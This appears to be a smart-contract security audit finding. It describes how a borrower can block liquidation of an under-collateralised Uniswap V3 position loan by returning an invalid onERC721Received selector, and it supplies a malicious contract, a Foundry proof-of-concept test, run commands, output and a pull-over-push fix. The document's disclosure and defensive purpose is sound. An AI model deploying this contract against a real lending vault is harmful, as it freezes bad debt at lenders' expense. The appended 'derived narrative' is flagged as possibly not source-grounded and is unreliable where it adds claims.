---
id: 20967
severity: "High"
---

# Owner of a position can prevent liquidation due to the `onERC721Received` callback

## Description

When liquidating a position, `_cleanUpLoan()` is called on the loan. This attempts to send the uniswap LP position back to the user via the following line:
```solidity
nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId);
```
This `safeTransferFrom` function call invokes the `onERC721Received` function on the owner’s contract. The transaction will only succeed if the owner’s contract returns the function selector of the standard `onERC721Received` function. However, the owner can design the function to return an invalid value, and this would lead to the `safeTransferFrom` reverting, thus being unable to liquidate the user.

## Proof of Concept

Below is a foundry test that proves this vulnerability. To run the PoC:

  1. Copy the attacker contract into `test/integration/V3Vault.t.sol`.
  2. In the same file, copy the contents of the ‘foundry test’ dropdown into the `V3VaultIntegrationTest` contract.
  3. In the terminal, enter `forge test --via-ir --mt test_preventLiquidation -vv`.

Attacker Contract:
```solidity
contract MaliciousBorrower {
    
    address public vault;

    constructor(address _vault) {
        vault = _vault;
    }
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {

        // Does not accept ERC721 tokens from the vault. This causes liquidation to revert
        if (from == vault) return bytes4(0xdeadbeef);

        else return msg.sig;
    }
}
```
Foundry test:
```solidity
function test_preventLiquidation() external {
        
        // Create malicious borrower, and setup a loan
        address maliciousBorrower = address(new MaliciousBorrower(address(vault)));
        custom_setupBasicLoan(true, maliciousBorrower);

        // assert: debt is equal to collateral value, so position is not liquidatable
        (uint256 debt,,uint256 collateralValue, uint256 liquidationCost, uint256 liquidationValue) = vault.loanInfo(TEST_NFT);
        assertEq(debt, collateralValue);

        // collateral DAI value change -100%
        vm.mockCall(
            CHAINLINK_DAI_USD,
            abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
            abi.encode(uint80(0), int256(0), block.timestamp, block.timestamp, uint80(0))
        );
        
        // ignore difference
        oracle.setMaxPoolPriceDifference(10001);

        // assert that debt is greater than collateral value (position is liquidatable now)
        (debt, , collateralValue, liquidationCost, liquidationValue) = vault.loanInfo(TEST_NFT);
        assertGt(debt, collateralValue);

        (uint256 debtShares) = vault.loans(TEST_NFT);

        vm.startPrank(WHALE_ACCOUNT);
        USDC.approve(address(vault), liquidationCost);

        // This fails due to malicious owner. So under-collateralised position can't be liquidated. DoS!
        vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");
        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, ""));
    }

    function custom_setupBasicLoan(bool borrowMax, address borrower) internal {
        // lend 10 USDC
        _deposit(10000000, WHALE_ACCOUNT);  

        // Send the test NFT to borrower account
        vm.prank(TEST_NFT_ACCOUNT);
        NPM.transferFrom(TEST_NFT_ACCOUNT, borrower, TEST_NFT);

        uint256 tokenId = TEST_NFT;

        // borrower adds collateral 
        vm.startPrank(borrower);
        NPM.approve(address(vault), tokenId);
        vault.create(tokenId, borrower);

        (,, uint256 collateralValue,,) = vault.loanInfo(tokenId);

        // borrower borrows assets, backed by their univ3 position
        if (borrowMax) {
            // borrow max
            vault.borrow(tokenId, collateralValue);
        }
        vm.stopPrank();
    }
```
Terminal output:
```
Ran 1 test for test/integration/V3Vault.t.sol:V3VaultIntegrationTest
[PASS] test_preventLiquidation() (gas: 1765928)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 473.56ms
```

## Recommendation

One solution would be to approve the NFT to the owner and provide a way (via the front-end or another contract) for them to redeem the NFT back later on. This is a “pull over push” approach and ensures that the liquidation will occur.

Example:
```solidity
function _cleanupLoan(uint256 tokenId, uint256 debtExchangeRateX96, uint256 lendExchangeRateX96, address owner)
    internal
{
    _removeTokenFromOwner(owner, tokenId);
    _updateAndCheckCollateral(tokenId, debtExchangeRateX96, lendExchangeRateX96, loans[tokenId].debtShares, 0);
    delete loans[tokenId];
    nonfungiblePositionManager.approve(owner, tokenId);
    emit Remove(tokenId, owner);
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a denial‑of‑service condition that allows the owner of a Uniswap V3 liquidity position, when represented as an ERC721 token, to block the liquidation of an under‑collateralised loan. The liquidation routine calls a private function that attempts to return the NFT to the borrower using the ERC721 safeTransferFrom method. SafeTransferFrom invokes the onERC721Received callback on the recipient contract and requires that the callback return the exact selector defined by the ERC721Receiver interface. Because the protocol assumes the borrower will accept the NFT, it does not verify the return value beyond the standard check. If the borrower is a contract that deliberately implements onERC721Received to return an incorrect selector, the safeTransferFrom call reverts with the error "ERC721: transfer to non ERC721Receiver implementer". This prevents the cleanup step of the liquidation, leaving the loan in an under‑collateralised state that cannot be resolved. The impact is that lenders cannot recover their collateral, the protocol’s accounting assumptions that collateral can always be reclaimed are broken, and a malicious borrower can effectively freeze the position, causing a DoS on the liquidation mechanism. The issue occurs only when the borrower is a contract capable of overriding the ERC721Receiver callback; it does not affect EOAs that automatically accept ERC721 transfers. It was discovered during a formal audit by constructing a malicious borrower contract that returns an invalid selector and confirming that liquidation reverts in a Foundry test. The problem is subtle because safeTransferFrom is normally reliable and developers may not anticipate a borrower deliberately breaking the callback contract. To remediate, the protocol should avoid pushing the NFT back to the borrower during liquidation. A pull‑over‑push pattern can be used: the contract should approve the NFT for the borrower and emit an event, allowing the borrower to withdraw the token later, or the liquidation logic should use a non‑safe transfer that does not invoke the callback, or include explicit checks that the transfer succeeded regardless of the receiver implementation. This change ensures that liquidation can always proceed and that collateral can be reclaimed even if the borrower contract is malicious, restoring the intended accounting guarantees of the vault.
